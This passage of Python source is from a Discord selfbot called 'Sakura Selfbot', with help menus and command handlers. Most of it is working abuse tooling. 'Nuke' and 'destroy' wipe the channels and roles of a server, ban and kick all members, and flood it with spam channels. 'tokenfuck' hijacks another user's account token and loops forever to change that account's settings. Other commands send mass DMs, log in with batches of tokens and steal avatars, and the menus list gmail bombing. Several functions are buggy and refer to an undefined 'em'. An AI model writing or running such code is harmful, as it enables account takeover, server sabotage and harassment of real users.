    embed.add_field(name="`pokes`",value="pokes ur hubby or fwend",inline=False)
    embed.add_field(name="`tickle`",value="Tickle the mentioned user",inline=False)
    embed.add_field(name="`hug`",value="give big hugs",inline=False)
    embed.add_field(name="`slap`",value="Slap dat hoe",inline=False)
    embed.add_field(name="`smug`",value="kinda weird I don't use it personally.",inline=False)
    embed.add_field(name="`pat`",value="Pat em cuz dey good",inline=False)
    embed.add_field(name="`kiss`",value="issa kith duh..",inline=False)
    embed.add_field(name="`Hug`",value="cuddle with your fav person",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)

@Sakura.command()
async def amc(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="AMC")
    embed.add_field(name="`setpfp`",value="Set the specified url as profile picture",inline=False)
    embed.add_field(name="`btcstream`",value="Stream current btc price",inline=False)
    embed.add_field(name="`pfpsteal`",value="Allows you to steal mentioned user profile picture",inline=False)
    embed.add_field(name="`blank`",value="Turns your name and profile picture blank",inline=False)
    embed.add_field(name="`hypesquad`",value="Allows you to change your hypesquad (ie: !hypesquad bravery)",inline=False)
    embed.add_field(name="`fakenet`",value="Allows you to spoof connections in your profile (ie: !fakenet skype Sakura)",inline=False)
    embed.add_field(name="`steal-all-pfp`",value="ion gotta explain -_-",inline=False)
    embed.add_field(name="`Stream`",value="add a stream status",inline=False)
    embed.add_field(name="`Playing`",value="add a playing status",inline=False)
    embed.add_field(name="`Listening`",value="add a listening status",inline=False)
    embed.add_field(name="`Watching`",value="add a watching status",inline=False)
    embed.add_field(name="`soff`",value="turns off status",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)

@Sakura.command()
async def fun(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="Fun")
    embed.add_field(name="`fox`",value="Random fox image",inline=False)
    embed.add_field(name="`dog`",value="Random dog image",inline=False)
    embed.add_field(name="`cat`",value="Random cat image",inline=False)
    embed.add_field(name="`minesweeper`",value="Play minesweeper in the discord chat",inline=False)
    embed.add_field(name="`rainbow`",value="Doesn't work for now Pix will fix it soon",inline=False)
    embed.add_field(name="`8ball`",value="Answers your question",inline=False)
    embed.add_field(name="`joke`",value="Drops a random joke in the chat",inline=False)
    embed.add_field(name="`slot`",value="Play slot machine in the discord chat",inline=False)
    embed.add_field(name="`topic`",value="Start a random topic to keep the chat going",inline=False)
    embed.add_field(name="`wyr`",value="Start a 'what would you rather' topic in the chat",inline=False)
    embed.add_field(name="`hack`",value="ping the user and troll them",inline=False)
    embed.add_field(name="`Nuke`",value="Nukes server that you send it in if you have admin",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)
	

@Sakura.command()
async def util(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="Util")
    embed.add_field(name="`bitly`",value="Shorten ur link using bitly",inline=False)
    embed.add_field(name="`tinyurl`",value="Shorten ur link using tinyurl",inline=False)
    embed.add_field(name="`backup-f`",value="Backup your friends name and discrim",inline=False)
    embed.add_field(name="`auto-bump`",value="Automatically bump server to disboard.org",inline=False)
    embed.add_field(name="`mac`",value="Lookup a bit of info about a MAC (ie: !mac xx:xx:xx:xx:xx:xx)",inline=False)
    embed.add_field(name="`copy`",value="Copies guild channels, categories, voice channels and makes them in a new one",inline=False)
    embed.add_field(name="`encode`",value="Encode a string to base64 ascii",inline=False)
    embed.add_field(name="`decode`",value="Decode a string from base64 to regular text",inline=False)
    embed.add_field(name="`eth`",value="Display current Ethereum price",inline=False)
    embed.add_field(name="`btc`",value="Display current Bitcoin price",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)
@Sakura.command()
async def hacking(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="Hacking")
    embed.add_field(name="`tokeninfo`",value="Display various information about the token",inline=False)
    embed.add_field(name="`tokenfuck`",value="Molests the given token",inline=False)
    embed.add_field(name="`ip`",value="Display various information about the IP",inline=False)
    embed.add_field(name="`gmail-bomb`",value="Spam a gmail [When you run it look in console]",inline=False)
    embed.add_field(name="`nitro`",value="Generate a random nitro code",inline=False)
    embed.add_field(name="`address(text)`",value="Generates fake address based on the text you specify",inline=False)
    embed.add_field(name="`masslogin`",value="Allows you to mass-login in bot/user tokens [Choices can be: user and bot]",inline=False)
    embed.add_field(name="`login`",value="Allows you to mass-login in bot/user tokens [Choices can be: user and bot]",inline=False)
    embed.add_field(name="`botlogin`",value="Allows you to mass-login in bot/user tokens [Choices can be: user and bot]",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)
@Sakura.command()
async def nuking(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="Nuking")
    embed.add_field(name="`Nuke`",value="Shits on the server",inline=False)
    embed.add_field(name="`Dmall`",value="10 second cooldown but u might get disabled",inline=False)
    embed.add_field(name="`Massban`",value="Ban all the users in that guild",inline=False)
    embed.add_field(name="`Massckick`",value="Kick all the users in that guild",inline=False)
    embed.add_field(name="`Massrole`",value="Mass create roles",inline=False)
    embed.add_field(name="`Masschannel`",value="Mass create channels",inline=False)
    embed.add_field(name="`delroles`",value="Delete all the roles",inline=False)
    embed.add_field(name="`delChannels`",value="Delete all the channels",inline=False)
    embed.add_field(name="`Massunban`",value="Unban every member",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)
    
@Sakura.command(aliases=['shorteen'])
async def bitly(ctx, *, link):
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            embed = discord.Embed(color=0xffcaff)
            embed.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}"+Fore.RESET)

@Sakura.command()
async def cuttly(ctx, *, link):
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            embed = discord.Embed()
            embed.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}"+Fore.RESET)

@Sakura.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Sakura 95 was here",
            description="Sakura was here",
            reason="Hahahahah Sakura SB go brrrrrrrrrrrrrrrrrrrrrr",
            icon="https://i.imgur.com/PYGihZi.jpeg",
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name='Sakura 95 was here')
    for _i in range(250):
        await ctx.guild.create_role(name='Sakura 95 was here', color=RandomColor())

@Sakura.command() 
async def cat(ctx):
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"fhttps://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            embed = discord.Embed()
            embed.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}"+Fore.RESET)

@Sakura.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(color=0xffcaff)
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@Sakura.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    embed = discord.Embed(title="Random fox image", color=0xffcaff)
    embed.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])    

@Sakura.command()
async def encode(ctx, string):
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@Sakura.command()
async def decode(ctx, string):
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Sakura.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    embed = discord.Embed(color=0xffcaff)
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            embed.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Sakura.command()
async def pingweb(ctx, website = None):
    await ctx.message.delete()
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)       

@Sakura.command()
async def tweet(ctx, username: str, *, message: str):
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            embed = discord.Embed(color=0xffcaff)
            embed.set_image(url=res["message"])
            await ctx.send(embed=em)

@Sakura.command()
async def revav(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        embed = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)


@Sakura.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role):
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild   .members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    embed = discord.Embed(colour=color)
    embed.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    embed.add_field(name="Users", value=users)
    embed.add_field(name="Mentionable", value=role.mentionable)
    embed.add_field(name="Hoist", value=role.hoist)
    embed.add_field(name="Position", value=role.position)
    embed.add_field(name="Managed", value=role.managed)
    embed.add_field(name="Colour", value=colour)
    embed.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@Sakura.command()
async def combine(ctx, name1, name2): 
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)       

@Sakura.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@Sakura.command(aliases=['dvwl'])
async def devowel(ctx, *, text):
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@Sakura.command()
async def blank(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file"+Fore.RESET)
    else:  
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:      
             await Sakura.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)

@Sakura.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Sakura.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)

@Sakura.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Sakura.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)

@Sakura.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0xffcaff)
    await ctx.send(embed=em)

@Sakura.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)

@Sakura.command(aliases=['tokenfucker', 'disable']) 
async def tokenfuck(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': "Sakura 95 was here",
        'icon': "https://i.pinimg.com/736x/4f/3c/a3/4f3ca38f6819fd6c735f411317e1720d.jpg",
        'name': "Sakura 95 was here",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)
            else:
                break   

@Sakura.command()
async def masslogin(ctx, choice = None):
    await ctx.message.delete()
    _masslogin(choice)

@Sakura.command()
async def masscon(ctx, _type, amount: int, *, name=None):
    await ctx.message.delete()
    payload = {
        'name': name,
        'visibility': 1 
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json', 
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5) 
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@Sakura.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None):
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
		'visibility': 1
	}
    headers = {
		'Authorization': token,
        'Content-Type':'application/json', 
	}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:            
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)





@Sakura.command()
async def copy(ctx):
    await ctx.message.delete()
    await Sakura.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Sakura.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
                    if isinstance(chann, discord.Role):
                        await x.create_role(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@Sakura.command()
async def Nuke(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
           await  channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass 
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
        )  
    except:
        pass                 
    for _i in range(500):
        await ctx.guild.create_text_channel(name="Sakura 95 was here")
        await ctx.guild.create_category(name="Sakura 95 was here")
        await ctx.guild.create_voice_channel(name="Sakura 95 was here")



@Sakura.command()
async def dmall(ctx, *, message):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@Sakura.command()
async def massBan(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@Sakura.command()
async def massKick(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@Sakura.command()
async def massRole(ctx):
    await ctx.message.delete()
    for _i in range(900):
        try:
            await ctx.guild.create_role(name="Sakura 95 was here", color=RandomColor())
        except:
            return    

@Sakura.command()
async def massChannels(ctx):
    await ctx.message.delete()
    for _i in range(900):
        try:
            await ctx.guild.create_text_channel(name="Sakura 95 was here")
        except:
            return

@Sakura.command()
async def delChannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Sakura.command() 
async def delRoles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Sakura.command()
async def massUnban(ctx):
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Sakura.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@Sakura.command()
async def dm(ctx, user : discord.Member, *, message):
    await ctx.message.delete()
    user = Sakura.get_user(user.id)
    if ctx.author.id == Sakura.user.id:
        return
    else:
        try:
            await user.send(message) 
        except:
            pass       


@Sakura.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    embed = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    embed.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em) 

@Sakura.command()
async def tinyurl(ctx, *, link):
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    embed = discord.Embed(color=0xffcaff)
    embed.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@Sakura.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break



@Sakura.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))



@Sakura.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Sakura.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid):
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Sakura.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}"+Fore.RESET)

@Sakura.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@Sakura.command()
async def upper(ctx, *, message):
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)


@Sakura.command(aliases=['guildpfp'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Sakura.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx):
    await ctx.message.delete()
    for friend in Sakura.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Sakura.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )

@Sakura.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=em)

@Sakura.command()
async def mac(ctx, mac):
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    embed = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
    embed.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)

@Sakura.command()
async def hack(ctx, user: discord.Member):
    await ctx.message.delete()
    PORN = ['Hacking', 'getting '+user.mention+' info', 'escaped mental health institution patient', 'almost done hacking...', 'cockblocker.exe downloaded', 'sending to the Sakura head quarters...', 'done.']
    message = await ctx.send(PORN[0])
    await asyncio.sleep(3)
    for _next in PORN[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Sakura.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
